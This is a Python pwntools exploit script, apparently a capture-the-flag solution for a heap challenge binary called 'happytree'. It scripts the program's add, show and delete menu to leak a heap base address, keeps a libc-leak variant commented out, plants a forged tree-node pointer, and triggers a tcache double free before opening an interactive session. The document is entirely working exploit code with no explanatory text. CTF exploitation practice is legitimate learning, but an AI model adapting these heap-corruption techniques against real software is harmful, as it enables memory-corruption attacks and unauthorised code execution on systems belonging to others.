#coding:utf-8
from pwn import *
context(arch='amd64',log_level='debug')
p=process('./happytree')
elf=ELF('./happytree')
libc=elf.libc

def add(size,content):
    p.sendlineafter('cmd>','1')
    p.sendlineafter('data:',str(size))
    p.sendlineafter('content:',content)
def show(size):
    p.sendlineafter('cmd>','3')
    p.sendlineafter('data:',str(size))
def delete(size):
    p.sendlineafter('cmd>','2')
    p.sendlineafter('data:',str(size))

'''
for i in range(8):
    add(i+0x90,str(i))
add(88,'2')
for i in range(8):
    delete(i+0x90)
add(66,'6'*8)
show(66)
p.recvuntil('6'*8)
libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x3ebd0a
success('libc_base:'+hex(libc_base))
'''
add(17,'17')
add(16,'16')
delete(16)
delete(17)
add(33,'3'*8)
show(33)
p.recvuntil('3'*8)
heap_base=u64(p.recv(6).ljust(8,'\x00'))-0x11e0a
success('heap_base:'+hex(heap_base))

delete(33)
add(35,p64(0)*3+p64(heap_base+0x11f10))#fake_node->right_node=17
delete(35)

add(19,'19')
add(18,'18')
add(17,'17')
delete(17)
delete(18)
delete(0)#tcache double free


p.interactive()
